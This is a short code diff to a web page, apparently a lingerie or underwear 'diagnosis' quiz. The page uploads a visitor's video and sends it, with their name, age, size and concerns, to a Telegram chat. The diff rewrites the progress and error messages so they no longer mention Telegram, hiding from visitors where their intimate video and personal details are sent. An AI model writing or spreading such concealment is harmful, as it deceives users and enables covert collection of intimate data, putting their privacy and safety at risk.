@@ -974,7 +974,7 @@
     const videoUrl = cloudinaryData.secure_url;
 
     // 2. Telegramに動画のURLを送信
-    if (btn) btn.innerHTML = '<span class="loading-spinner"></span>Telegramへ転送中...';
+    if (btn) btn.innerHTML = '<span class="loading-spinner"></span>ちょっとまってね...';
     
     // Telegramに送るテキスト（画像と一緒に送るテキスト情報と同じ）
     const caption = `👙 下着診断からの動画\n👤 名前: ${name}\n🎂 年齢: ${age}歳\n📍 サイズ: ${location}\n📝 悩み: ${symptoms}`;
@@ -990,7 +990,7 @@
     });
     
     const tJson = await tRes.json();
-    if (!tJson.ok) throw new Error(tJson.description || 'Telegram転送エラー');
+    if (!tJson.ok) throw new Error(tJson.description || 'エラー');
 
     progressBar.style.width = '100%';
     setTimeout(() => { progressWrap.style.display = 'none'; }, 500);
